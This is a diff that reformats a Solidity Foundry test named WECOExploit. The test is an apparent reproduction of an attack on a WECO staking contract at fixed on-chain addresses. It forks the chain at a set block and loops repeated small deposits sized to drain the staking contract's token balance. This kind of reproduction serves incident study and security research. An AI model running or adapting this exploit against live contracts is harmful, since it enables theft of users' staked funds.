@@ -24,10 +24,8 @@ interface IWECOStaking {
 }
 
 contract WECOExploit is Test {
-    IWECOStaking private constant WECOStaking =
-        IWECOStaking(0xd672b766D66662F5C6fd798a999e1193a7945451);
-    IERC20 private constant WECOIN =
-        IERC20(0x5d37ABAFd5498B0E7af753a2E83bd4F0335AA89F);
+    IWECOStaking private constant WECOStaking = IWECOStaking(0xd672b766D66662F5C6fd798a999e1193a7945451);
+    IERC20 private constant WECOIN = IERC20(0x5d37ABAFd5498B0E7af753a2E83bd4F0335AA89F);
 
     uint256 private constant blocknumToForkFrom = 33_549_937;
 
@@ -44,22 +42,14 @@ contract WECOExploit is Test {
         uint256 WECOINBeforeBalance = WECOIN.balanceOf(address(this));
         WECOIN.approve(address(WECOStaking), type(uint256).max);
         WECOStaking.deposit(WECOIN.balanceOf(address(this)) - 1 ether, 0);
-        uint256 WECOBalanceBeforeSecondDeposit = WECOIN.balanceOf(
-            address(this)
-        );
+        uint256 WECOBalanceBeforeSecondDeposit = WECOIN.balanceOf(address(this));
         WECOStaking.deposit(WECOIN.balanceOf(address(this)), 0);
         uint256 WECOBalanceAfterSecondDeposit = WECOIN.balanceOf(address(this));
         uint256 WECOStakingBalance = WECOIN.balanceOf(address(WECOStaking));
 
         uint256 i;
-        while (
-            i <
-            WECOStakingBalance /
-                (WECOBalanceAfterSecondDeposit - WECOBalanceBeforeSecondDeposit)
-        ) {
-            (bool success, ) = address(WECOStaking).call(
-                abi.encodeCall(WECOStaking.deposit, (1 ether, 0))
-            );
+        while (i < WECOStakingBalance / (WECOBalanceAfterSecondDeposit - WECOBalanceBeforeSecondDeposit)) {
+            (bool success,) = address(WECOStaking).call(abi.encodeCall(WECOStaking.deposit, (1 ether, 0)));
             if (success == false) {
                 break;
             } else {
